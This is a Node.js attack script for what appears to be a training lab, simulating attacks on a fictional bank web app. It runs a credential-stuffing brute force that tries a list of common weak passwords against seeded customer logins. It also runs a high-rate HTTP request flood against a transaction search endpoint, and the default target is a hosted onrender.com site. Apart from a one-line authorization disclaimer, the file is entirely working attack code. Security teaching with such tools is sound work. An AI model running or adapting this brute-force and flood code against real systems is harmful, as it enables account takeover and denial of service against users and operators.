// attack.js
//
// Binangonan Banking Corporation security simulation client.
//
// Modes:
//   node attack.js --mode=brute   Login brute force / credential stuffing
//   node attack.js --mode=flood   HTTP request flood against transaction search
//   node attack.js --mode=all     Run every mode in sequence
//
// Environment:
//   TARGET=https://ctm-bank.onrender.com'
//   DURATION_MS=4000
//   CONCURRENCY=10
//   REQUESTS_PER_TICK=50
//   BURST_INTERVAL_MS=10
//
// Only run this against systems you own or are explicitly authorized to test.

const axios = require('axios');
const http = require('http');
const https = require('https');

const BASE_URL = (process.env.TARGET || 'https://ctm-bank.onrender.com').replace(/\/+$/, '');
const DURATION_MS = Number(process.env.DURATION_MS || 4000);
const CONCURRENCY = Math.max(Number(process.env.CONCURRENCY || 10), 1);
const REQUESTS_PER_TICK = Math.max(Number(process.env.REQUESTS_PER_TICK || 50), 1);
const BURST_INTERVAL_MS = Math.max(Number(process.env.BURST_INTERVAL_MS || 10), 1);

const args = process.argv.slice(2);
const modeArg = args.find((arg) => arg.startsWith('--mode='));
const MODE = (modeArg ? modeArg.split('=')[1] : 'brute').toLowerCase();

const isHttps = BASE_URL.startsWith('https:');
const agent = isHttps
  ? new https.Agent({ keepAlive: true, maxSockets: 1000 })
  : new http.Agent({ keepAlive: true, maxSockets: 1000 });
const agentConfig = isHttps ? { httpsAgent: agent } : { httpAgent: agent };

const CUSTOMER_EMAILS = Array.from({ length: 30 }, (_, index) =>
  `customer${String(index + 1).padStart(3, '0')}@binangonanbank.test`
);

// Matches the passwords produced by seed.js.
const WEAK_PASSWORDS = [
  'password123',
  'Password1',
  'Welcome123',
  'P@ssw0rd',
  'letmein123',
  'Bank1234',
  'Admin@123',
];

function banner() {
  console.log('===================================================');
  console.log(' Binangonan Banking Corporation attack simulation');
  console.log(` Target: ${BASE_URL}`);
  console.log(` Mode:   ${MODE}`);
  console.log('===================================================');
}

function usage() {
  console.log(`
Usage:
  node attack.js --mode=brute
  node attack.js --mode=flood
  node attack.js --mode=all

Environment:
  TARGET=http://localhost:5000
  DURATION_MS=4000
  CONCURRENCY=10
  REQUESTS_PER_TICK=50
  BURST_INTERVAL_MS=10

Examples:
  TARGET=http://localhost:5000 node attack.js --mode=brute
  DURATION_MS=10000 node attack.js --mode=flood
`);
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function runPool(items, worker, concurrency = CONCURRENCY) {
  let index = 0;

  const runners = Array.from(
    { length: Math.min(concurrency, items.length) },
    async () => {
      while (index < items.length) {
        const item = items[index];
        index += 1;
        await worker(item);
      }
    }
  );

  await Promise.all(runners);
}

async function bruteForce() {
  console.log('\n[brute] Testing seeded customer accounts against weak passwords...');

  const pairs = [];
  for (const email of CUSTOMER_EMAILS) {
    for (const password of WEAK_PASSWORDS) {
      pairs.push({ email, password });
    }
  }

  let attempts = 0;
  let failures = 0;
  let networkErrors = 0;
  const found = [];

  await runPool(pairs, async ({ email, password }) => {
    attempts += 1;

    try {
      const response = await axios.post(
        `${BASE_URL}/api/login`,
        { email, password },
        { timeout: 5000, ...agentConfig }
      );

      const user = response.data?.user || {};
      found.push({ email, password, role: user.role, name: user.name });
      console.log(`[+] SUCCESS ${email} / ${password} (role=${user.role || 'unknown'})`);
    } catch (error) {
      if (error.response) {
        failures += 1;
      } else {
        networkErrors += 1;
      }
    }
  });

  console.log('\n[brute] Summary');
  console.log(`  attempts: ${attempts}`);
  console.log(`  rejected: ${failures}`);
  console.log(`  network errors: ${networkErrors}`);
  console.log(`  credentials found: ${found.length}`);

  if (found.length > 0) {
    console.log('\n[brute] Recovered credentials');
    for (const item of found) {
      console.log(`  ${item.email} / ${item.password} (${item.role || 'unknown'})`);
    }
  }
}

async function flood() {
  const endpoint = `${BASE_URL}/api/transactions/search?query=a`;
  console.log(`\n[flood] Sending bursts to ${endpoint} for ${DURATION_MS}ms...`);

  const start = Date.now();
  let sent = 0;
  let ok = 0;
  let failed = 0;
  let tickCount = 0;

  const interval = setInterval(() => {
    if (Date.now() - start >= DURATION_MS) {
      clearInterval(interval);
      return;
    }

    tickCount += 1;

    for (let i = 0; i < REQUESTS_PER_TICK; i++) {
      sent += 1;
      axios
        .get(endpoint, { timeout: 2000, ...agentConfig })
        .then(() => { ok += 1; })
        .catch(() => { failed += 1; });
    }
  }, BURST_INTERVAL_MS);

  await sleep(DURATION_MS + 2500);

  console.log('\n[flood] Summary');
  console.log(`  ticks: ${tickCount}`);
  console.log(`  sent: ${sent}`);
  console.log(`  ok: ${ok}`);
  console.log(`  failed: ${failed}`);
}

async function main() {
  if (args.includes('--help') || args.includes('-h')) {
    usage();
    return;
  }

  banner();

  if (MODE === 'brute') {
    await bruteForce();
  } else if (MODE === 'flood') {
    await flood();
  } else if (MODE === 'all') {
    await bruteForce();
    await flood();
  } else {
    console.log(`Unknown mode: ${MODE}`);
    usage();
    process.exitCode = 1;
  }
}

main().catch((error) => {
  console.error('Attack simulation error:', error.message);
  process.exit(1);
});
